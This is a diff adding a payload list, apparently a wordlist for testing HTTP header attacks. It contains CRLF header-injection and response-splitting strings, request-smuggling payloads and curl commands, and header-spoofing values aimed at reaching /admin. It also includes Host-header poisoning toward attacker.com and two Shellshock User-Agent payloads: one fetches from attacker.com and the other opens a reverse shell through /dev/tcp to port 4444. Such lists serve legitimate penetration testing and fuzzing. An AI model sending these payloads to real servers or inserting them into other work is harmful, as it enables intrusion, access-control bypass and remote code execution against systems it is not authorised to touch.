@@ -1,0 +1,44 @@
+%0d%0aSet-Cookie: injected=value
+%0aSet-Cookie: injected=value
+%0d%0aLocation: http://attacker.com
+%0aLocation: http://attacker.com
+\r\nSet-Cookie: injected=value
+\nSet-Cookie: injected=value
+\r\nLocation: http://attacker.com
+%0d%0aContent-Length: 0%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0a<script>alert(1)</script>
+value%0d%0aX-Injected-Header: evil
+value%0d%0a%0d%0a<html>injected content</html>
+%20HTTP/1.1%0d%0aHost: attacker.com%0d%0a
+GET / HTTP/1.1\r\nHost: attacker.com\r\n\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
+Transfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
+Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX
+curl -s -X POST https://target.com/endpoint -H "Transfer-Encoding: chunked" -H "Content-Length: 6" -d $'0\r\n\r\nX'
+curl -s -X POST https://target.com/endpoint -H "Transfer-Encoding: chunked" --data-binary $'5\r\nhello\r\n0\r\n\r\n'
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: attacker.com
+X-Forwarded-Proto: https
+X-Real-IP: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-For: ::1
+X-Host: attacker.com
+Host: attacker.com
+Host: target.com:443@attacker.com
+Host: target.com.attacker.com
+Host: attacker.com#target.com
+Referer: http://attacker.com
+Origin: http://attacker.com
+Origin: null
+User-Agent: () { :; }; /bin/bash -c 'curl http://attacker.com/shellshock'
+User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+%0d%0aX-Forwarded-For: 127.0.0.1
+%0aX-Forwarded-For: 127.0.0.1
+foo\r\nX-Forwarded-For: 127.0.0.1
